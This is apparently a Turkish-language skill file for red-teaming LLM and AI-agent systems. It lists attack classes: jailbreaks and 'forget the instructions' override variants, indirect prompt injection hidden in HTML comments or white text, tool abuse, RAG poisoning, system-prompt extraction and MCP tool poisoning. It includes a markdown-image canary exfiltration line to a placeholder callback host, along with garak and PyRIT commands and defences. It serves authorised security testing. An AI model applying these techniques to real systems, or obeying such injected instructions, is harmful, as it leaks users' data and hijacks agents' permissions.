---
name: llm-agent-security
description: "LLM ve AI ajan güvenliği: doğrudan/dolaylı prompt injection, tool abuse ve veri sızdırma zincirleri, RAG zehirleme, guardrail bypass; PyRIT/garak/AgentDojo ile ölçüm ve kanıt."
---
# LLM / AI Agent Security

## Amaç
Sohbet ajanı, RAG uygulaması veya tool-calling agent'ta güven sınırlarını kırmak: gizli sistem promptu, başka kullanıcı verisi, tool yetkileri ve dış çağrı (egress) üzerinden **ölçülebilir** etki. MCP sunucularını da kapsar.

## Tehdit modeli (önce yaz)
Varlıklar (sistem promptu, RAG dokümanları, kullanıcı verisi, tool kimlik bilgileri, egress), güven sınırları (kullanıcı→model, model→tool, tool→dış servis, doküman→bağlam), kısıtlar (guardrail, allowlist, human-in-the-loop). Her saldırıyı bir sınıra bağla.

## Araçlar
```bash
pipx install garak                     # NVIDIA garak: probe setleri
pip install pyrit                      # Azure PyRIT: orchestrator + converter + scorer
npm i -g promptfoo                     # eval/red-team harness
git clone https://github.com/ethz-spylab/agentdojo   # agent injection benchmark
```
API anahtarı/endpoint'i operatörden al; yerel model varsa `ollama`/`vLLM` ile tekrarlanabilir baseline kur.

## 1) Baseline ve keşif
- Sistem promptunu tespit et (rol, kısıtlar, tool listesi), model/versiyon, sıcaklık.
- Tool şemasını çıkar: hangi tool hangi parametreyle, kimin adına çalışıyor, SSRF/URL fetch var mı, dosya/DB erişimi var mı.
- Guardrail'leri ölç: ret oranı, yanıt uzunluğu, gecikme.

## 2) Saldırı sınıfları
- **Doğrudan injection / jailbreak**: rol yapma, çeviri/encoding (base64, leetspeak, Unicode tag), çok turlu kademeli ikna, "talimatları unut" varyantları.
- **Dolaylı injection** (en kritik): hedefin okuyacağı içerik (web sayfası, PDF, e-posta, kod yorumu, tool çıktısı, dosya adı) içine gömülü talimat. Örnek gömme biçimleri: HTML yorumu, beyaz metin, metadata, `data:` URI, görsel içi yazı.
- **Tool abuse / confused deputy**: kullanıcı yetkisiyle yapılmaması gereken işlemi agent'a yaptırma (başka kullanıcının kaydını okuma, e-posta gönderme, dosya yazma, iç URL fetch). Parametre düzeyinde BOLA/IDOR testi.
- **Veri sızdırma (exfil)**: markdown görsel/bağlantı ile canary callback (`![x](https://<interactsh>/<token>)`), tool çağrısıyla dış URL, DNS sorgusu.
- **RAG zehirleme**: bilgi tabanına eklenebilen dokümanla kalıcı yanlış yönlendirme veya talimat enjeksiyonu; retrieval sıralamasını manipüle etme.
- **Sistem promptu sızıntısı**: özetleme/çeviri/dil değiştirme ile çıkarma.
- **Model/ajan DoS**: token flooding, sonsuz tool döngüsü, pahalı çağrı tetikleme.
- **MCP'ye özgü**: tool poisoning (açıklama metnine gömülü talimat), rug pull (sonradan değişen tool), aşırı scope'lu token, sunucular arası geçiş.

## 3) Otomasyon
```bash
garak --model_type openai --model_name <model> --probes promptinject,leakreplay,dan,encoding
pyrit -r <config>   # orchestrator: converter zinciri + scorer ile ASR ölçümü
promptfoo redteam run -c promptfooconfig.yaml
python -m agentdojo.benchmark --suite workspace --attack important_instructions
```
Metrik: Attack Success Rate (ASR), sızıntı oranı, ortalama tur sayısı, guardrail yanlış pozitifi.

## 4) Impact kanıtı (canary ile, gerçek veri yok)
1. Hedefin okuyacağı bir yere (profil alanı, doküman, issue, ürün yorumu) canary talimatı yerleştir.
2. Agent'ı o içeriği işlemeye yönlendir; talimatın **dış çağrı** yapmasını iste.
3. interactsh/Burp Collaborator'da DNS/HTTP hit'ini göster — bu L3.
4. Tool abuse için: yalnız yetkisiz erişimin **kanıtı** olan tek alan (örn. başka kullanıcının adı) maskelenmiş şekilde.
5. Sistem promptu sızıntısı: ilk/son 2 satır maskeli.
L4: agent'ın yetkili olduğu kritik işlemi (para transferi, kullanıcı silme) prova amaçlı, geri alınabilir şekilde tetiklemek — yalnız açık onayla.

## 5) Savunma / doğrulama
Girdi-çıktı ayrımı, tool allowlist + parametre şeması, human approval, egress filtering (allowlist), sandbox, enjeksiyon sınıflandırıcı, RAG kaynak imzası, sistem promptunu sır olarak saklamama, en az yetki token, MCP sunucu pinleme.

## Tuzaklar
Model versiyonu değişince sonuç değişir; sıcaklık>0 tekrarlanabilirliği bozar; guardrail'ler yanlış negatif verebilir; "refusal" ile "sızıntı yok"u karıştırma.
